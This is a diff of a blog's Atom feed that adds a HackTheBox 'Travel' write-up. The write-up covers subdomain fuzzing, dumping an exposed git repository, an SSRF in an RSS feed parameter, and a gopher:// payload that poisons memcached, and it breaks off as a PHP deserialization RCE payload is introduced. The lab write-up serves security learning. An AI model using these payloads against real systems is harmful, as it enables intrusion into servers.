@@ -1,4 +1,281 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-06-27T10:30:42-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">#keepLearning</title><subtitle>An amazing website.</subtitle><author><name>Philipp Menner</name></author><entry><title type="html">HackTheBox - PlayerTwo</title><link href="http://localhost:4000/boxes/player2/" rel="alternate" type="text/html" title="HackTheBox - PlayerTwo" /><published>2020-05-30T11:33:36-04:00</published><updated>2020-05-30T11:33:36-04:00</updated><id>http://localhost:4000/boxes/player2</id><content type="html" xml:base="http://localhost:4000/boxes/player2/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-09-12T11:42:45-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">#keepLearning</title><subtitle>An amazing website.</subtitle><author><name>Philipp Menner</name></author><entry><title type="html">HackTheBox - Travel</title><link href="http://localhost:4000/boxes/travel/" rel="alternate" type="text/html" title="HackTheBox - Travel" /><published>2020-06-29T21:33:36-04:00</published><updated>2020-06-29T21:33:36-04:00</updated><id>http://localhost:4000/boxes/travel</id><content type="html" xml:base="http://localhost:4000/boxes/travel/">&lt;h1 id=&quot;starting-the-travel---overview&quot;&gt;Starting the travel - Overview&lt;/h1&gt;
+&lt;p class=&quot;text-justify&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Travel&lt;/code&gt; is an interesting box created by &lt;a href=&quot;https://app.hackthebox.eu/users/77141&quot;&gt;jkr&lt;/a&gt; and his team member &lt;a href=&quot;https://app.hackthebox.eu/users/13569&quot;&gt;xct&lt;/a&gt;. It required some fuzzing and enumerating to get a foothold, exploiting memcached abusing a SSRF vulnerability and finally modifying users by taking advantage of our LDAP privileges.&lt;/p&gt;
+&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
+&lt;p&gt;Since &lt;a href=&quot;#Nmap scan&quot;&gt;the nmap scan&lt;/a&gt; just shows ssh, http and https as open, we browse to 10.10.10.189 and the landing page mentions a blog, so scanning for subdomains is the next logical step:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--filter&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;l!=144&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://travel.htb&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host: FUZZ.travel.htb&quot;&lt;/span&gt;
+
+000000032:   200        345 L    1408 W   24462 Ch    &lt;span class=&quot;s2&quot;&gt;&quot;blog&quot;&lt;/span&gt;                         
+000001035:   200        345 L    1408 W   24462 Ch    &lt;span class=&quot;s2&quot;&gt;&quot;Blog&quot;&lt;/span&gt;                         
+000001226:   200        51 L     126 W    1123 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;ssl&quot;&lt;/span&gt;                          
+000004315:   200        51 L     126 W    1123 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;SSL&quot;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Accessing the blog subdomain reveals a couple of things:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;user admin&lt;/li&gt;
+  &lt;li&gt;Wordpress login at http://blog.travel.htb/wp-login.php&lt;/li&gt;
+  &lt;li&gt;WP user registration not allowed&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p class=&quot;text-justify&quot;&gt;Also, from reading the source code of the landing page we find another subdomain called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://blog-dev.travel.htb/&lt;/code&gt; which we get a 403 forbidden when browsing to. However we can scan this subdomain either with gobuster or nmap to find out that there’s a git repository hidden:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~/HTB/boxes/travel&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; 5 blog.travel.htb
+80/tcp  open  http     nginx 1.17.6
+| http-git:
+|   10.10.10.189:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; edit this file &lt;span class=&quot;s1&quot;&gt;'description'&lt;/span&gt; to name the...
+|_    Last commit message: moved to git
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p class=&quot;text-justify&quot;&gt;When fuzzing we need to use an appropriate wordlist such as the default Kali one &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dirb/common.txt&lt;/code&gt;.
+Now we can use &lt;a href=&quot;https://github.com/arthaud/git-dumper&quot;&gt;git-dumper&lt;/a&gt; to dump the git repository which gives us the following files:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~/HTB/boxes/travel/git/clone&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;README.md		&lt;span class=&quot;c&quot;&gt;# Mentions the setup of the site, the path `wp-content/themes/twentytwenty`&lt;/span&gt;
+rss_template.php	&lt;span class=&quot;c&quot;&gt;# Reveals how the feed is working, mentions `debug.php`&lt;/span&gt;
+template.php		&lt;span class=&quot;c&quot;&gt;# Contains class `TemplateHelper` and a helper function `safe` which checks an&lt;/span&gt;
+			&lt;span class=&quot;c&quot;&gt;# URL for attempted LFI, command injection or SSRF&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;getting-rce&quot;&gt;Getting RCE&lt;/h2&gt;
+&lt;p class=&quot;text-justify&quot;&gt;The next steps all revolve around these three files so reading them thoroughly is definitely recommended.
+If we look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rss_template.php&lt;/code&gt; more closely we see what the mitigations mentioned in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;safe&lt;/code&gt; function of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;template.php&lt;/code&gt; are for:&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# From rss_template.php&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'QUERY_STRING'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strpos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;custom_feed_url&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;# Searches the URL for the first occurence of `custom_feed_url`&lt;/span&gt;
+                &lt;span class=&quot;nv&quot;&gt;$tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# break URL into two parts&lt;/span&gt;
+                &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;               &lt;span class=&quot;c1&quot;&gt;# set $url to the string after the '='&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;				&lt;span class=&quot;c1&quot;&gt;# if no custom feed was specified use the following one:&lt;/span&gt;
+                &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://www.travel.htb/newsfeed/customfeed.xml&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+         &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+         &lt;span class=&quot;nv&quot;&gt;$feed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;get_feed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;# call get_feed rss&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p class=&quot;text-justify&quot;&gt;So reading the code, we can apparently specify a custom feed url. To test this we set up a local http server and try to access it browsing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://blog.travel.htb/awesome-rss/?custom_feed_url=http://IP:8000/&lt;/code&gt; and we record a GET request:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server
+Serving HTTP on 0.0.0.0 port 8000 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:8000/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
+10.10.10.189 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;01/AUG/2020 10:25:32] &lt;span class=&quot;s2&quot;&gt;&quot;GET / HTTP/1.1&quot;&lt;/span&gt; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Therefore we have a server side request forgery (SSRF) vulnerability, lets see what we can request by looking at how the content is processed:&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;url_get_contents&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;safe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;escapeshellarg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$pl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;curl &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# in short:&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;curl &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;escapeshellarg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p class=&quot;text-justify&quot;&gt;As this is a simple curl call and the input is sanitized via escapeshellarg, I was not able to use this to upload a shell. 
+Looking further at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;safe&lt;/code&gt; function from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;temlpate.php&lt;/code&gt; we see a comment &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;// this should be secure&lt;/code&gt; hinting, that it’s probably not secure. So where can we do something forbidden?
+Playing around a little bit and searching the web &lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery&quot;&gt;I found out&lt;/a&gt; that we can circumvent the localhost restriction using the IP &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0.0.0.0&lt;/code&gt;. What do we want to access on localhost? Well, looking at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rss_template.php&lt;/code&gt; again, we see that there is a connection established to a memcached service via&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$simplepie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;set_cache_location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'memcache://127.0.0.1:11211/?timeout=60&amp;amp;prefix=xct_'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p class=&quot;text-justify&quot;&gt;Searching now for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memcached SSRF&lt;/code&gt; I found the tool &lt;a href=&quot;https://github.com/tarunkant/Gopherus&quot;&gt;Gopherus&lt;/a&gt; which came in handy to create payloads. Following through the steps, choosing the default payload and changing the IP from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0.0.0.0&lt;/code&gt; results in the following string, which we enter as the custom feed url:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gopher://0.0.0.0:11211/_%0d%0aset%20SpyD3r%204%200%2016%0d%0aO:5:%22Hello%22:0:%7B%7D%0d%0a
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p class=&quot;text-justify&quot;&gt;To find out whether this worked or not, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;debug.php&lt;/code&gt; mentioned in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rss_template.php&lt;/code&gt; proofed to be useful. We find it browsing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php&lt;/code&gt; - the path mentioned earlier in the README.md file - showing a table with truncated data after refreshing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://blog.travel.htb/awesome-rss/&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;~~~~~~~~~~~~~~~~~~~~~&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;xct_&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4e5612&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;ba&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(...)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;a:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;s:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;child&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;a:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;s:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;a:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(...)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~~~~~~~~~~~~~~~~~~~~~&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;If we use our custom feed url from above we get to see another entry:&lt;/p&gt;
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;~~~~~~~~~~~~~~~~~~~~~&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;SpyD&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;O:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;Hello&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;xct_&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4e5612&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;ba&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(...)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;a:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;s:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;child&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;a:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;s:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;a:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(...)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~~~~~~~~~~~~~~~~~~~~~&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p class=&quot;text-justify&quot;&gt;So the the awesome-rss blog page is cached in the second row. Once it’s in there it will revert to this entry when refreshing the awesome-rss blog page - but if we can write our payload in there in the meantime it will execute that instead. For this we need the key which is unfortunately truncated. This can be achieved either by reading the simplepie source code (turns out the key is generated by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xct_ + md5(md5(feed_url) + &quot;:spc&quot;)&lt;/code&gt;) or by deploying things locally. I went for the latter and after some tweaking I retrieved the key from memcached:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;telnet 127.0.0.1 11211
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+stats items
+STAT items:16:number 1
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;snip]
+stats cachedump 16 100
+ITEM xct_4e5612ba079c530a6b1f148c0b352241 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2737 b&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 1595004892 s]
+END
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Now that we got the key we can verify that we are now able to overwrite an existing cache entry. By changing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SpyD3r&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xct_4e5612ba079c530a6b1f148c0b352241&lt;/code&gt;. 
+Now, to get RCE, the class &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TemplateHelper&lt;/code&gt; from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;template.php&lt;/code&gt; file might come in handy because of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_put_contents&lt;/code&gt; function. By following this &lt;a href=&quot;https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a&quot;&gt;post&lt;/a&gt; on how to exploit php deserialization and using &lt;a href=&quot;https://www.unserialize.com/&quot;&gt;this tool&lt;/a&gt; I came up with the following payload:&lt;/p&gt;
